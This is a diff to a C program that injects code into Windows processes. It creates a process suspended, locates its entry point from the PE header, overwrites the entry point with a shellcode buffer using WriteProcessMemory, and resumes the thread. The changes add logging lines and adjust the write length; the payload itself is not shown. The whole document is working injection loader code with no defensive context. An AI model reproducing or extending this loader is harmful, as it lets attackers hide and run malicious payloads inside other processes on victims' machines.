@@ -33,6 +33,8 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
+	printf("[Info] - Created process %d in suspended state\n", processInformation.dwProcessId);
+
 	// get process basic information
 	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
 	if (error)
@@ -59,16 +61,20 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
+	printf("[Info] - Read PE header at %p\n", processBasesAddress);
+
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
 	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
 	LPVOID entryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (int64_t)processBasesAddress);
 
 	// write the shellcode to the entry point
-	if (!WriteProcessMemory(processInformation.hProcess, entryPoint, shellcode, sizeof(shellcode), NULL))
+	if (!WriteProcessMemory(processInformation.hProcess, entryPoint, shellcode, sizeof(shellcode)-1, NULL))
 	{
 		printf("Error %d - Failed to write shellcode to entry point\n", GetLastError());
 		return 1;
 	}
+
+	printf("[Info] - Wrote shellcode to entrypoint at %p\n", entryPoint);
 
 	// resume the thread of the suspended process
 	if (ResumeThread(processInformation.hThread) == -1)
@@ -76,6 +82,8 @@ int main(int argc, char* argv[])
 		printf("Error %d - Failed to resume thread\n", GetLastError());
 		return 1;
 	}
+
+	printf("[Info] - Resumed thread %p\n", processInformation.hThread);
 
 	return 0;
 }
